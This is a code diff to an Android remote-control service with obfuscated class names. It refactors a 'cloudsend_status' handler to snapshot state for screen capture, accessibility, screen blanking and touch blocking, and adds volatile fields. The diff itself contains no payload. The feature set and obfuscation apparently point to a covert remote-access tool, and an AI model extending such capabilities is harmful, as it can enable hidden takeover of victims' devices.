@@ -158,15 +158,24 @@ class DFm8Y8iMScvB2YDw : Service() {
             }
             "cloudsend_status" -> {
                 try {
+                    val snapIsStart = _isStart
+                    val snapMP = mediaProjection
+                    val snapShouldRun = shouldRun
+                    val snapPendingIgnore = nZW99cdXQ0COhB2o.isIgnorePending
+                    val snapAccessibility = nZW99cdXQ0COhB2o.isOpen
+                    val snapBIS = BIS
+                    val snapSKL = SKL
+                    val snapTouchBlock = nZW99cdXQ0COhB2o.isTouchBlockOn
+
                     JSONObject().apply {
-                        put("video", _isStart && mediaProjection != null)
-                        put("screenshot", shouldRun)
-                        put("share", _isStart)
-                        put("ignore", shouldRun)
-                        put("blank", BIS)
-                        put("penetrate", SKL)
-                        put("touchblock", nZW99cdXQ0COhB2o.isTouchBlockOn)
-                        put("accessibility", nZW99cdXQ0COhB2o.isOpen)
+                        put("video", snapIsStart && snapMP != null)
+                        put("screenshot", snapShouldRun && snapAccessibility)
+                        put("share", snapIsStart)
+                        put("ignore", snapShouldRun || snapPendingIgnore)
+                        put("blank", snapBIS)
+                        put("penetrate", snapSKL)
+                        put("touchblock", snapTouchBlock)
+                        put("accessibility", snapAccessibility)
                     }.toString()
                 } catch (e: Exception) {
                     Log.e("MainService", "cloudsend_status build failed", e)
@@ -307,8 +316,11 @@ class DFm8Y8iMScvB2YDw : Service() {
     }
 
     companion object {
+        @Volatile
         private var _isReady = false // media permission ready status
+        @Volatile
         private var _isStart = false // screen capture start status
+        @Volatile
         private var _isAudioStart = false // audio capture start status
 
         var ctx: DFm8Y8iMScvB2YDw? = null
@@ -331,6 +343,7 @@ class DFm8Y8iMScvB2YDw : Service() {
     private var reuseVirtualDisplay = Build.VERSION.SDK_INT > 33
 
     // video
+    @Volatile
     private var mediaProjection: MediaProjection? = null
     private var surface: Surface? = null
     private val sendVP9Thread = Executors.newSingleThreadExecutor()
